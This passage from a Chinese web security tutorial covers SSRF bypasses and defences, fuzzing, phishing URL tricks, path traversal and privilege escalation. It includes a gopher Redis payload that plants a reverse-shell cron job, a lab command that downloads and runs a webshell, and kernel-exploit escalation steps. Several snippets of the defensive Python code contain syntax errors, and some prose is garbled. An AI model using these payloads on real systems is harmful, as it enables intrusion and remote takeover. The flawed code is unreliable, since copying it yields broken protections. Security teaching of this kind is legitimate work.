如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过，可以使用如`http://httpbin.org/redirect-to?url=http://192.168.0.1`等服务跳转，但是由于URL中包含了`192.168.0.1`这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过，常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会
    
##### <font color="yellow">0005 通过各种非HTTP协议</font>

如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用，比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的，例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL

`gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a`

除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似`file:///path/to/file`这种格式来访问计算机本地文件，使用file协议可以避免服务端程序对于所访问的IP进行的过滤例如我们可以通过`file:///d:/1.txt`来访问D盘中`1.txt`的内容
    
##### <font color="yellow">0006 DNS Rebinding</font>

一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求

但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击，要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0

这样就可以进行攻击了，完整的攻击流程为

- 服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
- 对于获得的IP进行判断，发现为非黑名单IP，则通过验证
- 服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址
- 由于已经绕过验证，所以服务器端返回访问内网资源的结果
    
##### <font color="yellow">0007 利用IPv6</font>

有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如`[::] 0000::1`或IPv6的内网域名来绕过过滤
    
##### <font color="yellow">0008 利用IDN</font>

一些网络访问工具如Curl等是支持国际化域名(Internationalized Domain Name,IDN)的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名，在这些字符中，部分字符会在访问时做一个等价转换，例如`ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ`和`example.com`等同，利用这种方式，可以用`①` `②` `③` `④` `⑤` `⑥` `⑦` `⑧` `⑨` `⑩`等字符绕过内网限制

#### <font color="yellow">005 可能的利用点</font>

##### <font color="yellow">0001 内网服务</font>

- Apache Hadoop远程命令执行
- axis2-admin部署Server命令执行
- Confluence SSRF
- counchdb WEB API远程命令执行
- dict
- docker API远程命令执行
- Elasticsearch引擎Groovy脚本命令执行
- ftp / ftps（FTP爆破）
- glassfish任意文件读取和war文件部署间接命令执行
- gopher
- HFS远程命令执行
- http、https
- imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）
- Java调试接口命令执行
- JBOSS远程Invoker war命令执行
- Jenkins Scripts接口命令执行
- ldap
- mongodb
- php_fpm/fastcgi 命令执行
- rtsp - smb/smbs（连接SMB）
- sftp
- ShellShock 命令执行
- Struts2 命令执行
- telnet
- tftp（UDP协议扩展）
- tomcat命令执行
- WebDav PUT上传任意文件
- WebSphere Admin可部署war间接命令执行
- zentoPMS远程命令执行

##### <font color="yellow">0002 Redis利用</font>

- 写ssh公钥
- 写crontab
- 写WebShell
- Windows写启动项
- 主从复制加载`.so`文件
- 主从复制写无损文件

##### <font color="yellow">0003 云主机</font>

在AWS、Google等云环境下，通过访问云环境的元数据API或管理API，在部分情况下可以实现敏感信息等效果

##### <font color="yellow">0004 防御方式</font>

- 过滤返回的信息
- 统一错误信息
- 限制请求的端口
- 禁止不常用的协议
- 对DNS Rebinding，考虑使用DNS缓存或者Host白名单

##### <font color="yellow">0005 如何在Python开发中拒绝SSRF漏洞</font>

###### <font color="yellow">a. SSRF漏洞常见防御及绕过方法</font>

SSRF是一种常见的Web漏洞，于需要请求外部内容的逻辑存在中，比如本地化网络图片、XML解析时的外部实体注入、软件的离线下载等，URL，提供代码直接请求这个URL，将造成SSRF漏洞

具体表现在以下几个财团上

- URL为内网IP或域名，攻击者可以通过SSRF漏洞扫描目标内网，并寻找内网内的漏洞，想办法快速瞄准
- URL中包含端口，攻击者可以扫描并发现内网中的其他服务，再进一步进行利用
- 当请求方法允许其他协议的时候，将可能使用gophar、file等协议进行服务利用，如利用内网的redis获取权限、利用fastcgi进行getshell等

特别是这些年，大量利用SSRF攻击网服务的案例被爆出来，导致SSRF漏洞逐渐出现，这给Web应用开发者提出了一个难题：如何在保证业务正常的情况下防御SSRF漏洞？很多开发者认为，只要检查一下请求url的host不为内网IP

这个观点提出了两个技术要点

- 如何检查IP是否为内网IP
- 如何获取真正请求的主机

于是，通过这两个技术小窍门，想办法解决很多方法

###### <font color="yellow">b. 如何检查IP是否为内网IP</font>

这实际上是很多开发者提出的第一个问题，很多问题甚至连内网IP经常的段数也很多，何谓内网IP，实际上并没有一个硬性的规定，到多少段必须设置为内网的例子，通常我们为内网以下三个段设置为内网，所有内网内的机器分配到的IP在这些段中

`192.168.0.0/16` => `192.168.0.0` ~ `192.168.255.255`
`10.0.0.0/8` => `10.0.0.0` ~ `10.255.255.255`
`172.16.0.0/12` => `172.16.0.0` ~ `172.31.255.255`

所以，通常情况下，我们只需要判断目标IP不在这三个段，另外还包括`127.0.0.0/8`和`0.0.0.0/8`，在Linux下，`127.0.0.1`与`0.0.0.0`都本地本地，参考[http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)，很多人会忘记`127.0.0.0/8`，认为本地地址就是`127.0.0.1`，实际上本地回环包括了整个127段，你可以访问`http://127.233.233.233/`，会发现和请求`127.0.0.1`是一个结果，所以我们需要防御的实际上是5个段，只要IP不免这5个段中，就认为是“安全”的，网上一些开发者会选择使用“正则”的方式判断目标IP是否在这几个段中，这种判断方法是会遗漏还是误判

比如

```python
if re.match(r"^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$",ip_addess) or \
    re.match(r"^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$",ip_addess) or \
        re.match(r"^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$",ip_addess):
    raise BaseException("inner ip addess attack")
```

这是Sec-News最新版本判断内网IP的方法，里面使用正则判断IP是否时间网的几个段中

问题

- 利用八进制IP地址绕过
- 利用十六进制IP地址绕过
- 利用十进制的IP地址绕过
- 利用IP地址的省略写法绕过

写法(5个例子)：`012.0.0.1`、`0xa.0.0.1`、`167772161`、`10.1`、`0xA000001`但都请求请求是`10.0.0.1`，他们一个都匹配不上正则表达式，更聪明的人是不会用正则表达式来检测IP的(这种人并不多见于内网的正则一则特定规范写)，Wordpress的做法，先将IP地址化，然后`。`将其分割成数组parts，然后根据`parts[0]`和`parts[1]`的取值来判断

```php
if(! $same_host) {
    $host = trim($parsed_url['host'],'.');
    if(preg_match('#^(([1-9]?\d|1\d\d|25[0-5]|2[0-4]\d){3}[1-9]?\d|1\d\d|25[0-5]|2[0-4]\d)$#',$host)) {
        $ip = $host;
    }
    else {
        $ip = gethostbyname($host);
        if($ip === $host) // Error condition for gethostbyname()
            $ip = false;
    }
    if($ip) {
        $parts = array_map('intval',explode('.',$ip));
        if(127 === $parts[0]|| 10 === $parts[0] || 0 === $parts[0] || (172 === $parts[0] && 16<= $parts[1] && 31 >= $parts[1]) || (192 === $parts[0] && 168 === $parts[1])
        ) {
            // If host appears local,reject unless specifically allowed
            /*
                * Check if HTTP request is external or not

                * Allows to change and allow external requests for the HTTP request

                * @since 3.6.0

                * @param bool false Whether HTTP request is external or not
                * @param string $host IP of the requested host
                * @param string $url URL of the requested host
            */
            if(! apply_filters('http_request_host_is_external',false,$host,$url)) {
                return false;
            }
        }
    }
}
```

其实也略显麻烦，而且曾经也出现过用过方法的案例(WordPress<4.5SSRF分析)，不推荐使用，[http://xlab.baidu.com/wordpress/](http://xlab.baidu.com/wordpress/)，我又选择了一种更简单的方法，转换IP地址是可以转换成一个转换的，在PHP中调用`ip2long`函数转换，在Python使用`inet_aton`去转换，那么IP地址是一一对应的，和`0.0.0.0 == 0，255.255.255.255 == 2^32 - 1`，所以，我们判断一个IP是否在某个IP段内，最将IP段的话题值、目标IP值全部转换为可能，然后比较大小，于是，我们可以将之前的正则匹配的方法修改为如下方法

```php
if ip2long("10.0.0.0") <= ip_long <= ip_long("10.255.255.255") or \
    ip2long("172.16.0.0") <= ip_long <= ip_long("172.31.255.255") or \
    ip2long("192.168.0.0") <= ip_long <= ip_long("192.168.255.255") or \
    ip2long("127.0.0.0") <= ip_long <= ip_long("127.255.255.255"):
    raise BaseException("inner ip address attack")
```

这就是一个最简单的方法，也最容易理解，偷看你知道一点掩码的知识，你知道IP地址的掩码实际上就是这样(32-IP地址所代表的数字的末尾bit数)，将以上判断修改地更简单

```python
from socket import inet_aton
from struct import unpack

def ip2long(ip_addr):
    return unpack("!L", inet_aton(ip_addr))[0]

def is_inner_ipaddress(ip):
    ip = ip2long(ip)
    return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
        ip2long('10.0.0.0') >> 24 == ip >> 24 or \
        ip2long('172.16.0.0') >> 20 == ip >> 20 or \
        ip2long('192.168.0.0') >> 16 == ip >> 16 \
        ip2long('0.0.0.0') >> 24 == ip >> 24
```

以上代码也就是Python中判断一个IP是否是内网IP的最终方法，使用时调用`is_inner_ipaddress(...)`即可(注意自己编写捕捉异常的代码)

###### <font color="yellow">c. host获取与绕过</font>

如何获取"真正请求"的Host，这里需要考虑三个问题

- 如何正确的获取用户输入的URL的Host？
- 只要Host只要不是内网IP即可吗？
- 只要Host指向的IP不是内网IP即可吗？

1. 第一个问题

> 看起来很简单，但实际上有很多网站在获取Host上犯过一些错误，最常见的就是，使用`http://233.233.233.233@10.0.0.1:8080/`、`http://10.0.0.1#233.233.233.233`这样的URL，让后端认为其Host是`233.233.233.233`，实际上请求的却是`10.0.0.1，这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL
> 
> 在Python 3下，正确获取一个URL的Host的方法
> 
> ```python
> from urllib.parse import urlparse
> 
> url = 'https://10.0.0.1/index.php'
> urlparse(url).hostname
> ```
> 
> 这一步一定不能犯错，否则后面的工作就白做了

2. 第二个问题

> 只要检查一下我们获取到的Host是否是内网IP，即可防御SSRF漏洞么？答案是否定的，原因是，Host可能是IP形式，也可能是域名形式，如果Host是域名形式，我们是没法直接比对的，只要其解析到内网IP上，就可以绕过我们的`is_inner_ipaddress`了，网上有个服务`http://xip.io`，这是一个“神奇”的域名，它会自动将包含某个IP地址的子域名解析到该IP，比如`127.0.0.1.xip.io`，将会自动解析到`127.0.0.1`，`www.10.0.0.1.xip.io`将会解析到`10.0.0.1`，这个域名极大的方便了我们进行SSRF漏洞的测试，当我们请求`http://127.0.0.1.xip.io/info.php`的时候，表面上请求的Host是`127.0.0.1.xip.io`，此时执行`is_inner_ipaddress`(`'127.0.0.1.xip.io'`)是不会返回True的，但实际上请求的却是`127.0.0.1`，这是一个标准的内网IP，所以，在检查Host的时候，我们需要将Host解析为具体IP，再进行判断，代码如下
> 
> ```python
> import socket
> import re
> from urllib.parse import urlparse
> from socket import inet_aton
> from struct import unpack
> 
> def check_ssrf(url):
>     hostname = urlparse(url).hostname
> 
>     def ip2long(ip_addr):
>         return unpack("!L", inet_aton(ip_addr))[0]
> 
>     def is_inner_ipaddress(ip):
>         ip = ip2long(ip)
>         return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
>                 ip2long('10.0.0.0') >> 24 == ip >> 24 or \
>                 ip2long('172.16.0.0') >> 20 == ip >> 20 or \
>                 ip2long('192.168.0.0') >> 16 == ip >> 16 \
>                 ip2long('0.0.0.0') >> 24 == ip >> 24
> 
>     try:
>         if not re.match(r"^https?://.*/.*$", url):
>             raise BaseException("url format error")
>         ip_address = socket.getaddrinfo(hostname, 'http')[0][4][0]
>         if is_inner_ipaddress(ip_address):
>             raise BaseException("inner ip address attack")
>         return True, "success"
>     except BaseException as e:
>         return False, str(e)
>     except:
>         return False, "unknow error"
> ```
> 
> 首先判断url是否是一个HTTP协议的URL(如果不检查，攻击者可能会利用file、gophar等协议进行攻击)，然后获取url的host，并解析该host，最终将解析完成的IP放入`is_inner_ipaddress`函数中检查是否是内网IP

3. 第三个问题

> 是不是做了以上工作，解析并判断了Host指向的IP不是内网IP，即防御了SSRF漏洞？，答案继续是否定的，上述函数并不能正确防御SSRF漏洞，当我们请求的目标返回30X状态的时候，如果没有禁止跳转的设置，大部分HTTP库会自动跟进跳转，此时如果跳转的地址是内网地址，将会造成SSRF漏洞，这个原因也很好理解，我以Python的requests库为例，requests的API中有个设置，叫`allow_redirects`，当将其设置为True的时候requests会自动进行30X跳转，而默认情况下(开发者未传入这个参数的情况下)，requests会默认将其设置为True
> 
> ```python
> def get(url,params = None,**kwargs):
>     '''Sends a GET request
>         :param url : URL for the new :class:'Request' object
>         :param params : (optional) Dictionary or bytes to be sent in the query string for the :class:'Request'
>         :param \*\*kwargs : Optional argunents that ''request'' takes
>         :return : :class:'Response <Response>' object
>         :rtype : requests.Response
>     '''
>     kwargs.setdefault('allow_redirects',True)
>     return request('get',url,params-params=params,**kvargs)
> ```
> 
> 所以，我们可以试试请求一个302跳转的网址，默认情况下，将会跟踪location指向的地址，所以返回的status code是最终访问的页面的状态码，而设置了`allow_redirects`的情况下，将会直接返回302状态码，所以，即使我们获取了`http://t.cn/R2iwH6d`的Host，通过了`is_inner_ipaddress`检查，也会因为302跳转，跳到一个内网IP，导致SSRF
> 
> 这种情况下，我们有两种解决方法
> 
> - 设置`allow_redirects=False`，不允许目标进行跳转
> - 每跳转一次，就检查一次新的Host是否是内网IP，直到抵达最后的网址
> 
> 第一种情况明显是会影响业务的，只是规避问题而未解决问题，当业务上需要目标URL能够跳转的情况下，只能使用第二种方法了，所以，归纳一下，完美解决SSRF漏洞的过程如下
> 
> - 解析目标URL，获取其Host
> - 解析Host，获取Host指向的IP地址
> - 检查IP地址是否为内网IP
> - 请求URL
> - 如果有跳转，拿出跳转URL，执行1

###### <font color="yellow">d. 使用requesrs库的hooks属性来检查SSRF</font>

那么，上一章说的5个过程，具体用Python怎么实现？我们可以写一个循环，循环条件就是“该次请求的状态码是否是30X”，如果是就继续执行循环，继续跟进location，如果不是，则退出循环

代码如下

```python
r = requests.get(url, allow_redirects=False)
while r.is_redirect:
    url = r.headers['location']
    succ, errstr = check_ssrf(url)
    if not succ:
        raise Exception('SSRF Attack.')
    r = requests.get(url, allow_redirects=False)
```

这个代码思路大概没有问题，但非常简陋，而且效率不高，只要你翻翻requests的源代码，你会发现，它在处理30X跳转的时候考虑了很多地方

- 所有请求放在一个`requests.Session()`中
- 跳转有个缓存，当下次跳转地址在缓存中的时候，就不用多次请求了
- 跳转数量有最大限制，不可能无穷无尽跳下去
- 解决307跳转出现的一些BUG等

如果说就按照之前简陋的代码编写程序，固然可以防御SSRF漏洞，但上述提高效率的方法均没用到，那么，有更好的解决方法么？当然有，我们翻一下requests的源代码，可以看到一行特殊的代码

```python
r = dispath_hook('response',hooks,r,**kargs)
```

hook的意思就是“劫持”，意思就是在hook的位置我可以插入我自己的代码，我们看看`dispatch_hook`函数做了什么

```python
def dispatch_hook(key, hooks, hook_data, **kwargs):
    """Dispatches a hook dictionary on a given piece of data."""
    hooks = hooks or dict()
    hooks = hooks.get(key)
    if hooks:
        if hasattr(hooks, '__call__'):
            hooks = [hooks]
        for hook in hooks:
            _hook_data = hook(hook_data, **kwargs)
            if _hook_data is not None:
                hook_data = _hook_data
    return hook_data
```

`hooks`是一个函数，或者一系列函数，这里做的工作就是遍历这些函数，并调用：`_hook_data = hook(hook_data, **kwargs)`，我们翻翻文档，可以找到hooks event的说明[http://docs.python-requests.org/en/master/user/advanced/?highlight=hook#event-hooks](http://docs.python-requests.org/en/master/user/advanced/?highlight=hook#event-hooks)，文档中定义了一个`print_url`函数，将其作为一个`hook`函数，在请求的过程中，响应对象被传入了`print_url`函数，请求的域名被打印了下来，我们可以考虑一下，我们将检查SSRF的过程也写为一个`hook`函数，然后传给`requests.get`，在之后的请求中一旦获取response就会调用我们的`hook`函数，这样，即使我设置`allow_redirects=True`，requests在每次请求后都会调用一次`hook`函数，在hook函数里我只需检查一下`response.headers['location']`即可，说干就干，先写一个`hook`函数

```python
def _request_check_location(r,*args,**kwargs):
    if not r.is_redirect:
        return
    url = r.headers['location']

    # The scheme should be lower case...
    passed = urlparse(url)
    url = parsed.geturl()

    '''
        Faciliate relative 'location' headers,as allowed by RFC 7231
        (e.g. '/path/to/resource' instead of 'http://doamin.tid/path/to/resource')
        Compliant with RFC3986,we percent encode the url
    '''
    if not passed.netloc:
        url = urljoin(r.url,requote_uri(url))
    else:
        url = requote_uri(url)
    
    succ,errstr = check_ssrf(url)
    if not succ:
        raise requests,exeptions.InvalidURL("SSRF Attack: %s" % (errstr,))
```

当`r.is_redirect`为`True`的时候，也就是说这次请求包含一个跳转，获取此时的`r.headers['location']`，并进行一些处理，最后传入`check_ssrf`，当检查不通过时，抛出一个异常，然后编写一个请求函数`safe_request_url`，意思是“安全地请求一个URL”，使用这个函数请求的域名，将不会出现SSRF漏洞

```python
def safe_request_url(url,**kawrgs):
    def _request_check_location(r,*args,**kwargs):
        if not r.is_redirect:
            return
        url = r.headers['location']

        # The scheme should be lower case...
        passed = urlparse(url)
        url = parsed.geturl()

        '''
            Faciliate relative 'location' headers,as allowed by RFC 7231
            (e.g. '/path/to/resource' instead of 'http://doamin.tid/path/to/resource')
            Compliant with RFC3986,we percent encode the url
        '''
        if not passed.netloc:
            url = urljoin(r.url,requote_uri(url))
        else:
            url = requote_uri(url)
        
        succ,errstr = check_ssrf(url)
        if not succ:
            raise requests,exeptions.InvalidURL("SSRF Attack: %s" % (errstr,))
    
    success,errstr = check_ssrf(url)
    if not success:
        raise requests.exception.InvalidURL("SSRF Attack: %s" % (errstr,))
    
    hooks = dict(response = _requset_check_location)
    kawrgs['hooks'] = hooks
    return requests.get(url,**kwargs)
```

我们可以看到，在第一次请求url前，还是需要`check_ssrf`一次的，因为`hook`函数`_request_check_location`只是检查30X跳转时是否存在SSRF漏洞，而没有检查最初请求是否存在SSRF漏洞，不过上面的代码还不算完善，因为`_request_check_location`覆盖了原有(用户可能定义的其他`hooks`)的`hooks`属性，所以需要简单调整一下，最终，给出完整代码

```python
import socket
import re
import requests
from urllib.parse import urlparse
from socket import inet_aton
from struct import unpack
from requests.utils import requote_uri

def check_ssrf(url):
    hostname = urlparse(url).hostname

    def ip2long(ip_addr):
        return unpack("!L", inet_aton(ip_addr))[0]

    def is_inner_ipaddress(ip):
        ip = ip2long(ip)
        return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
                ip2long('10.0.0.0') >> 24 == ip >> 24 or \
                ip2long('172.16.0.0') >> 20 == ip >> 20 or \
                ip2long('192.168.0.0') >> 16 == ip >> 16 \
                ip2long('0.0.0.0') >> 24 == ip >> 24

    try:
        if not re.match(r"^https?://.*/.*$", url):
            raise BaseException("url format error")
        ip_address = socket.getaddrinfo(hostname, 'http')[0][4][0]
        if is_inner_ipaddress(ip_address):
            raise BaseException("inner ip address attack")
        return True, "success"
    except BaseException as e:
        return False, str(e)
    except:
        return False, "unknow error"

def safe_request_url(url, **kwargs):
    def _request_check_location(r, *args, **kwargs):
        if not r.is_redirect:
            return
        url = r.headers['location']

        # The scheme should be lower case...
        parsed = urlparse(url)
        url = parsed.geturl()

        # Facilitate relative 'location' headers, as allowed by RFC 7231.
        # (e.g. '/path/to/resource' instead of 'http://domain.tld/path/to/resource')
        # Compliant with RFC3986, we percent encode the url.
        if not parsed.netloc:
            url = urljoin(r.url, requote_uri(url))
        else:
            url = requote_uri(url)

        succ, errstr = check_ssrf(url)
        if not succ:
            raise requests.exceptions.InvalidURL("SSRF Attack: %s" % (errstr, ))

    success, errstr = check_ssrf(url)
    if not success:
        raise requests.exceptions.InvalidURL("SSRF Attack: %s" % (errstr,))

    all_hooks = kwargs.get('hooks', dict())
    if 'response' in all_hooks:
        if hasattr(all_hooks['response'], '__call__'):
            r_hooks = [all_hooks['response']]
        else:
            r_hooks = all_hooks['response']

        r_hooks.append(_request_check_location)
    else:
        r_hooks = [_request_check_location]

    all_hooks['response'] = r_hooks
    kwargs['hooks'] = all_hooks
    return requests.get(url, **kwargs)
```

外部程序只要调用`safe_request_url(url)`即可安全地请求某个URL，该函数的参数与`requests.get`函数参数相同，完美在Python Web开发中解决SSRF漏洞，其他语言的解决方案类似，大家可以自己去探索

## <font color="yellow">0x03 其他Web安全</font>

### <font color="yellow">01 FUZZ模糊测试</font>

#### <font color="yellow">001 简介</font>

模糊测试是一种自动或半自动的测试技术，常被用来发现软件/操作系统/网络的代码中的错误和安全性问题，其中用于输入随机的数据和不合法的数据被称为FUZZ，之后，系统将被监视各种异常，如系统崩溃或内置代码失败等，模糊测试最初是由威斯康辛大学的巴顿·米勒于1989年开发的，模糊测试是一种软件测试技术，是安全测试的一种

#### <font color="yellow">002 原因</font>

- 通常，模糊测试会发现最严重的的安全错误或缺陷
- 当与黑箱测试、Beta测试和其他调试方法一起使用时，Fuzz测试会产生更有效的结果
- 模糊测试用于检测软件的脆弱性，这是一种非常经济有效的测试技术
- 模糊测试是黑盒测试技术之一，模糊是黑客发现系统漏洞最常用的方法之一

#### <font color="yellow">003 步骤</font>

- 识别目标系统
- 确定输入
- 生成模糊数据
- 使用模糊数据执行测试
- 监控系统的行为
- 记录缺陷

#### <font color="yellow">004 举例</font>

- Mutation-Based Fuzzers：alter existing data samples to create new test data, This is the very simple and straightforward approach, this starts with valid samples of protocol and keeps mangling every byte or file
- Generation-Based Fuzzers：define new data based on the input of the model, It starts generating input from the scratch based on the specification
- PROTOCOL-BASED-fuzzer

	最成功的fuzzer是对正在测试的协议格式有详细的了解，理解取决于规范，它包括在工具中编写一个规范数组，然后使用基于模型的测试生成技术遍历规范并在数据内容、序列等中添加不规则性，这也称为语法测试、语法测试、健壮性测试等，Fuzzer可以从现有的测试用例生成测试用例，也可以使用有效或无效的输入

主要包含3中不同类型的fuzzer，基于交叉、生成和协议的，由于部分翻译起来比较生硬，还是英文对比起来比较直观，所以就不翻译了

protocol-based fuzzing的两个限制

- 在规范成熟之前不能进行测试
- 许多有用的协议都是已发布协议的扩展，如果fuzz测试基于已发布的规范，则新协议的测试覆盖率将受到限制

模糊技术最简单的形式是将随机输入作为协议包或事件发送给软件，这种传递随机输入的技术对于发现许多应用程序和服务中的错误非常有用，其他技术也是可用的，并且很容易实现，要实现这些技术，我们只需要更改现有的输入，我们可以通过交换输入的位来改变输入

#### <font color="yellow">005 通过模糊测试检测到的bug类型</font>

- Assertion failures and memory leaks：this methodology is widely used for large applications where bugs are affecting the safety of memory, which is a severe vulnerability
- Invalid input：In fuzz testing, fuzzers are used to generate an invalid input which is used for testing error-handling routines, and this is important for the software which does not control its input, Simple fuzzing can be known as a way to automate negative testing
- Correctness bugs：Fuzzing can also be used to detect some types of correctness bugs, Such as a corrupted database, poor search results, etc

总的来说包括了以上3种类型的bug

- 内存泄漏
- 非法输入
- 部分正确的bug

#### <font color="yellow">006 Advantages of Fuzz Testing</font>

- 提升了软件安全性的测试
- 模糊测试发现的通常是严重的错误，而且是容易被黑客攻击的错误
- 模糊测试可以发现那些由于时间和资源限制而无法被测试人员发现的错误

#### <font color="yellow">007 Disadvantages of Fuzz Testing</font>

- 仅靠模糊测试无法全面了解整个安全威胁或bug
- 在处理不会导致程序崩溃的安全威胁时，例如某些病毒、蠕虫、木马等，模糊测试的效率较低
- 模糊测试只能检测简单的错误或威胁
- 为了有效地执行，这将需要大量的时间
- 设置带有随机输入的边值条件是非常有问题的，但是现在使用基于用户输入的确定性算法，大多数测试人员解决了这个问题

#### <font color="yellow">008 总结</font>

在软件工程中，Fuzz测试显示应用程序中存在bug，模糊不能保证在应用程序中完全检测出bug，但是通过使用Fuzz技术，它确保了应用程序的健壮性和安全性，因为这种技术有助于暴露大多数常见的漏洞

### <font color="yellow">02 网络钓鱼</font>

钓鱼攻击使用多种技术，一封电子邮件信息或网页的显示同其运行表现出欺骗性差异

#### <font color="yellow">001 复制图片和网页设计、相似的域名</font>

用户鉴别网站的一种方法是检查地址栏中显示的URL，为了达到欺骗目的，攻击者会注册一个域名，它看起来同要假冒的网站域名相似，有时攻击者还会改变大小写或使用特殊字符，由于大多数浏览器是以无衬线字体显示URL的，因此，`paypaI.com`可用来假冒`paypal.com`，`barcIays.com`可用来假冒`barclays.com`，更常见的是，假域名只简单地将真域名的一部分插入其中，例如，用`ebay-members-security.com`假冒`ebay.com`，用`users-paypal.com`假冒`paypal.com`，而大多数用户缺少判断一个假域名是否真正为被仿冒公司所拥有的工具和知识

#### <font color="yellow">002 URL隐藏</font>

假冒URL的另一种方法利用了URL语法中一种较少用到的特性，用户名和密码可包含在域名前，语法为`:http://username:password@domain/`，攻击者将一个看起来合理的域名放在用户名位置，并将真实的域名隐藏起来或放在地址栏的最后，例如`http://chncto.com/%6C%6C...%6C@211.112.228.2`，网页浏览器的最近更新已关闭了这个漏洞，其方法是在地址栏显示前将URL中的用户名和密码去掉，或者只是简单的完全禁用含用户名/密码的URL语法，Internet Explorer就使用了后一种办法

#### <font color="yellow">003 IP地址</font>

隐藏一台服务器身份的最简单办法就是使它以IP地址的形式显示，如`http://210.93.**.250`，这种技术的有效性令人难以置信，由于许多合法URL也包含一些不透明且不易理解的数字，因此，只有懂得解析URL且足够警觉的用户才有可能产生怀疑

#### <font color="yellow">004 欺骗性的超链接</font>

一个超链接的标题完全独立于它实际指向的URL，攻击者利用这种显示和运行间的内在差异，在链接标题中显示一个URL，而在背后使用了一个完全不同的URL，即便是一个有着丰富知识的用户，他在看到消息中显而易见的URL后也可能不会想到去检查其真实的URL，检查超链接目的地址的标准方法是将鼠标放在超链接上，其URL就会在状态栏中显示出来，但这也可能被攻击者利用JavaScript或URL隐藏技术所更改

#### <font color="yellow">005 隐藏提示</font>

还有一种更复杂的攻击，它不是在URL上做文章，而是通过完全替换地址栏或状态栏达到使其提供欺骗性提示信息的目的，最近发生的一次攻击就使用了用JavaScript在Internet Explorer的地址栏上创建的一个简单的小窗口，它显示的是一个完全无关的URL

#### <font color="yellow">006 弹出窗口</font>

最近对Citibank客户的一次攻击使网页复制技术前进了一步，它在浏览器中显示的是真实的Citibank网页，但在页面上弹出了一个简单的窗口，要求用户输入个人信息

#### <font color="yellow">007 社会工程</font>

钓鱼攻击还使用非技术手段使用户坠入陷阱，其中的一个策略就是急迫性，从而使用户急于采取行动，而较少花时间去核实消息的真实性，另一个策略是威胁用户，如果不按照所要求的去做就会造成可怕的后果，如终止服务或关闭帐户，少数攻击还许诺将获得巨额回报(如，你中了一个大奖!)，但威胁攻击更为常见，用户往往会对不劳而获产生怀疑，这可能是人类的本能

### <font color="yellow">03 路径遍历(目录遍历)</font>

#### <font color="yellow">001 简介</font>

路径遍历攻击也称为目录遍历，旨在，访问存储在web根文件夹之外的文件和目录，通过操纵带有点-斜线(…)序列及其变化的文件或使用绝对路径来引用文件的变量，来访问存储在文件系统上的任意文件和目录，包括应用程序源代码、配置和关键系统文件，需要注意的是，系统访问控制(如在微软Windows操作系统上锁定或使用文件)限制了对文件的访问权限

- 靶机：`192.168.1.113`
- 攻击机：`192.168.1.110`

owasp-zap web漏洞扫描器，自动挖掘web应用程序中的漏洞，高危漏洞path traversal，打开之后发现一串代码，这是返回etc/passwd/的文件信息，接下来在浏览器中把passswd修改为shadow就可以查看该站点shadow的文件内容，但是发现并没有返回shadow的对应信息，因为服务器设置的shadow是不可用的，修改路径可以得到不同的内容，只要该路径下存在该内容，或者该文件设置的对应权限是可读的

#### <font color="yellow">002 利用目录遍历漏洞获取shell思路</font>

- 上传webshell到服务器
- 之后通过对应的目录遍历路径访问webshell，执行webshell
- 在kali linux当中获取反弹shell

dbadmin敏感目录有敏感页面，浏览器访问，使用弱口令尝试登陆，弱口令有字母型和数字型，字母型是用123456作为对应的用户名和密码，数字型是用admin作为用户名和密码，使用admin进行登录可以进入系统后台，在系统后台新建数据库，数据表，字段(写入`<?php system("cd /tmp;wget http://192.168.1.110:8000/webshell.php;chmod +x webshell.php;php webshell");?>`)，创建服务器用于靶场机器下载对应webshell

#### <font color="yellow">003 提权</font>

提权前提：已经拿到低权shell，被入侵机器上有nc,python,perl等工具，有权限上传文件和下载文件

内核溢出漏洞提权，先对系统相关信息收集

查看发行版本

- `cat/etc/issue`
- `cat/etc/*-release`

查看内核版本

- `uname -a`

寻找内核溢出代码

上传内核溢出代码，编译执行

|searchsploit|发行版本|内核版本|
|-|-|-|
|gcc xxx.c|-o|exploit|
|chmod|+x|exploit|

./exploit

明文root密码提权

